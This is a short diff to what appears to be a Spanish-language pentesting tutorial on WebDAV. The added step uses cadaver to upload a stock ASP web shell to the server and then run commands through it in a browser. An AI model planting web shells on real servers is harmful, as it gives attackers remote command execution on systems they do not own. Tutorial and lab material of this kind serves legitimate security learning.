@@ -128,7 +128,12 @@ dav:/webdav/> cd carpeta1
 dav:/webdav/carpeta1/> get archivo2.txt
 dav:/webdav/carpeta1/> exit
 ```
+Después de entrar con cadaver podemos lanzar una shell a la web, haciendo:
 
+````
+put /usr/share/webshells/asp/webshell.asp
+````
+Después entramos al navegador de donde esta WebDav y ya podemos ejecutar comandos entrando con las credenciales claro.
 ---
 
 ## 6. Pasos para descargar archivos con davtest, cadaver y herramientas complementarias
